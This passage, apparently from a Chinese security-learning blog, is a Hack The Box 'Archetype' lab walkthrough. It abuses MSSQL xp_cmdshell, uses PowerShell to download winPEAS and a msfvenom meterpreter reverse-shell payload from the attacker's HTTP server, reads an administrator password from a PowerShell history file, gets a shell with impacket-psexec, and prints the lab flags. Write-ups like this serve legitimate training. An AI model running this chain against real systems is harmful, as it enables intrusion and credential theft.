+</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;xp_cmdshell&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.                                                   
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; xp_cmdshell whoami
+</span></span><span class="line"><span class="cl">output              
+</span></span><span class="line"><span class="cl">-----------------   
+</span></span><span class="line"><span class="cl">archetype<span class="se">\s</span>ql_svc   
+</span></span><span class="line"><span class="cl">NULL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：xp_cmdshell</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>What script can be used in order to search possible paths to escalate privileges on Windows hosts?</p>
+<p>可以使用什么脚本来搜索在 Windows 主机上提升权限的可能路径？</p>
+</blockquote>
+<p>WinPEAS（Windows Privilege Escalation Awesome Script） 是 Windows 本地提权信息收集工具。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# apt install peass
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/usr/share/peass/winpeas<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">pwd</span>                    
+</span></span><span class="line"><span class="cl">/usr/share/peass/winpeas
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/usr/share/peass/winpeas<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">65796</span>
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">11226112</span> Sep  <span class="m">5</span> 05:21 winPEASany.exe
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">11182592</span> Sep  <span class="m">5</span> 05:21 winPEASany_ofs.exe
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root    <span class="m">40226</span> Sep  <span class="m">5</span> 05:21 winPEAS.bat
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root    <span class="m">94970</span> Sep  <span class="m">7</span> 05:33 winPEAS.ps1
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">11225600</span> Sep  <span class="m">5</span> 05:21 winPEASx64.exe
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">11182080</span> Sep  <span class="m">5</span> 05:21 winPEASx64_ofs.exe
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">11226112</span> Sep  <span class="m">5</span> 05:21 winPEASx86.exe
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">11182592</span> Sep  <span class="m">5</span> 05:21 winPEASx86_ofs.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们要想办法让靶机下载到 WinPEAS 脚本。</p>
+<p>先切换到公共目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; xp_cmdshell powershell -c <span class="s2">&#34;cd C:/Users/Public;dir&#34;</span>
+</span></span><span class="line"><span class="cl">output                                                                             
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------   
+</span></span><span class="line"><span class="cl">NULL                                                                               
+</span></span><span class="line"><span class="cl">NULL                                                                               
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>ublic                                                     
+</span></span><span class="line"><span class="cl">NULL                                                                               
+</span></span><span class="line"><span class="cl">NULL                                                                               
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name                                                                     
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----                                                                     
+</span></span><span class="line"><span class="cl">d-r---        1/19/2020  10:39 PM                Documents                                                                
+</span></span><span class="line"><span class="cl">d-r---        9/15/2018  12:12 AM                Downloads                                                                
+</span></span><span class="line"><span class="cl">d-r---        9/15/2018  12:12 AM                Music                                                                    
+</span></span><span class="line"><span class="cl">d-r---        9/15/2018  12:12 AM                Pictures                                                                 
+</span></span><span class="line"><span class="cl">d-r---        9/15/2018  12:12 AM                Videos                                                                   
+</span></span><span class="line"><span class="cl">NULL                                                                               
+</span></span><span class="line"><span class="cl">NULL                                                                               
+</span></span><span class="line"><span class="cl">NULL     
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在 kali 上开启一个 http 服务，供靶机访问：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/usr/share/peass/winpeas<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机去访问并下载 winPEAsx64.exe 文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; xp_cmdshell powershell -c <span class="s2">&#34;iwr http://10.10.16.102/winPE
+</span></span></span><span class="line"><span class="cl"><span class="s2">ASx64.exe -o C:\Users\Public\winPeASx64.exe&#34;</span>
+</span></span><span class="line"><span class="cl">output   
+</span></span><span class="line"><span class="cl">------   
+</span></span><span class="line"><span class="cl">NULL  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建一个反弹 shell 脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.102 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1234</span> -f exe -o s
+</span></span><span class="line"><span class="cl">hell.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">509</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7680</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: shell.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后让靶机下载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; xp_cmdshell powershell -c <span class="s2">&#34;iwr http://10.10.16.102/shell.exe -o C:\Users\Public\shell.exe&#34;</span>
+</span></span><span class="line"><span class="cl">output   
+</span></span><span class="line"><span class="cl">------   
+</span></span><span class="line"><span class="cl">NULL  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后打开 msf，进行配置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# msfconsole
+</span></span><span class="line"><span class="cl">msf &gt; use exploit/multi/handler 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nv">PAYLOAD</span> <span class="o">=</span>&gt; windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 10.10.16.102
+</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; 10.10.16.102
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">1234</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.16.102:1234 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">248902</span> bytes<span class="o">)</span> to 10.129.95.187
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机执行 shell.exe 文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; xp_cmdshell powershell -c <span class="s2">&#34;C:\Users\Public\shell.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到 shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; shell
+</span></span><span class="line"><span class="cl">Process <span class="m">2604</span> created.
+</span></span><span class="line"><span class="cl">Channel <span class="m">1</span> created.
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.2061<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这时在执行 winpeas</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt;winPeASx64.exe fileanalysis
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/12.-archetype/assets/image-20261105165248665.png"
+	width="1234"
+	height="757"
+	srcset="/p/12.-archetype/assets/image-20261105165248665_hu12731274629504651306.png 480w, /p/12.-archetype/assets/image-20261105165248665_hu8644940252095376642.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261105165248665"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="391px"
+	
+></p>
+<p><strong>答案：winpeas</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>What file contains the administrator&rsquo;s password?</p>
+<p>管理员密码位于哪个文件？</p>
+</blockquote>
+<p>查看刚才 winpeas 扫出来的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt;type C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
+</span></span><span class="line"><span class="cl">net.exe use T: <span class="se">\\</span>Archetype<span class="se">\b</span>ackups /user:administrator MEGACORP_4dm1n!!
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：ConsoleHost_history.txt</strong></p>
+<h3 id="submit-user-flag">Submit User Flag
+</h3><blockquote>
+<p>Submit the flag located on the sql_svc user&rsquo;s desktop.</p>
+<p>提交位于 sql_svc 用户桌面上的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>esktop&gt;type user.txt
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> user.txt
+</span></span><span class="line"><span class="cl">3e7b102e78218e935bf3f4951fec21a3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：3e7b102e78218e935bf3f4951fec21a3</strong></p>
+<h3 id="submit-root-flag">Submit Root Flag
+</h3><blockquote>
+<p>Submit the flag located on the administrator&rsquo;s desktop.</p>
+<p>提交位于管理员桌面上的标志。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# impacket-psexec administrator@10.129.95.187
+</span></span><span class="line"><span class="cl">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.129.95.187.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file gqGNYOPS.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.129.95.187.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service Druo on 10.129.95.187.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service Druo.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.2061<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type</span> root.txt
+</span></span><span class="line"><span class="cl">b91ccec3305e98240082d4474b848528
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：b91ccec3305e98240082d4474b848528</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/assets/image-20261104205444073.d9e4fd976e03998d17a7cc2012db183c_hu3527743922139951764.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB Starting Point 入门系列"
+                        
+                        data-hash="md5-2eT9l24DmY0Xp8wgEtsYPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Starting Point 入门系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
